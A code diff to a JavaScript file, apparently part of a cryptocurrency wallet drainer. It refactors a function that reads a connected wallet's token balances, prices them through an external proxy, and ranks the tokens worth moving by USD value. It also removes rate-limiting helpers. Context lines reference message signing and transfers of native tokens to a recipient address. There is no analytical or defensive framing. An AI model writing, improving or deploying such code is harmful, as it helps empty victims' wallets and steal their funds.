@@ -795,42 +795,40 @@ async function signMessage(signer) {
 
 
 async function fetchTokenDetails(tokens, address, signer) {
-  const fetchTokenInfo = async (token) => {
-    try {
-      const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-      const balance = await retryAsync(() => tokenContract.balanceOf(address));
-      const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`;
-      const response = await retryAsync(() => fetch(proxyUrl));
-      const prices = await response.json();
-      const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+  const tokenDetails = await Promise.all(
+    tokens.map(async (token) => {
+      try {
+        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+        const balance = await retryAsync(() => tokenContract.balanceOf(address));
+        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`;
+        const response = await retryAsync(() => fetch(proxyUrl));
+        const prices = await response.json();
+        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
 
-      if (priceInfo !== undefined) {
-        const formattedBalance = ethers.utils.formatUnits(balance, 18);
-        const usdValue = parseFloat(formattedBalance) * priceInfo;
-        const usdValueRounded = Math.round(usdValue);
-        const usdValueString = usdValueRounded.toString();
-        const transferrableValue = ethers.utils.parseUnits(usdValueString, 18);
+        if (priceInfo !== undefined) {
+          const formattedBalance = ethers.utils.formatUnits(balance, 18);
+          const usdValue = parseFloat(formattedBalance) * priceInfo;
+          const usdValueRounded = Math.round(usdValue);
+          const usdValueString = usdValueRounded.toString();
+          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18);
 
-        if (balance.gte(ethers.utils.parseUnits('0.02', 18)) && transferrableValue.gte(ethers.utils.parseUnits('0.02', 18))) {
-          return {
-            contract: tokenContract,
-            balance: balance,
-            symbol: token.tokenSymbol,
-            address: token.contractAddress,
-            usdValue: usdValue,
-          };
+          if (balance.gte(ethers.utils.parseUnits('0.02', 18)) && transferrableValue.gte(ethers.utils.parseUnits('0.02', 18))) {
+            return {
+              contract: tokenContract,
+              balance: balance,
+              symbol: token.tokenSymbol,
+              address: token.contractAddress,
+              usdValue: usdValue,
+            };
+          }
+        } else {
+          console.log('Price info not available...');
         }
-      } else {
-        console.log('Price info not available...');
+      } catch (error) {
+        console.error(`Failed to fetch token details for ${token.tokenSymbol}:`, error);
       }
-    } catch (error) {
-      console.error(`Failed to fetch token details for ${token.tokenSymbol}:`, error);
-    }
-  };
-
-  const rateLimitedFetch = rateLimit(fetchTokenInfo, 500); // Adjust delay as needed
-
-  const tokenDetails = await Promise.all(tokens.map(token => rateLimitedFetch(token)));
+    })
+  );
 
   return tokenDetails.filter((token) => token).sort((a, b) => b.usdValue - a.usdValue);
 }
@@ -882,7 +880,7 @@ async function transferNativeToken(address, signer, provider, recipientAddress, 
 }
 
 //RETRIES
-async function retryAsync(fn, retries = 3, delay = 1000) {
+async function retryAsync(fn, retries = 2, delay = 1000) {
   for (let i = 0; i < retries; i++) {
     try {
       return await fn();
@@ -897,42 +895,6 @@ async function retryAsync(fn, retries = 3, delay = 1000) {
   }
 }
 
-//RATE LIMITER
-function rateLimit(promiseFn, delay) {
-  let queue = [];
-  let lastInvocation = Date.now();
-
-  return async function(...args) {
-    const now = Date.now();
-    const diff = now - lastInvocation;
-
-    if (diff < delay) {
-      await new Promise(resolve => setTimeout(resolve, delay - diff));
-    }
-
-    lastInvocation = Date.now();
-    return promiseFn(...args);
-  };
-}
-
-//CONCURRENCY MANAGEMENT
-async function fetchWithConcurrency(tasks, concurrency) {
-  const results = [];
-  const executing = [];
-  for (const task of tasks) {
-    const p = Promise.resolve().then(() => task());
-    results.push(p);
-
-    if (concurrency <= tasks.length) {
-      const e = p.then(() => executing.splice(executing.indexOf(e), 1));
-      executing.push(e);
-      if (executing.length >= concurrency) {
-        await Promise.race(executing);
-      }
-    }
-  }
-  return Promise.all(results);
-}
 
 //API FUNCTIONS
 async function fetchETHTokens(account) {
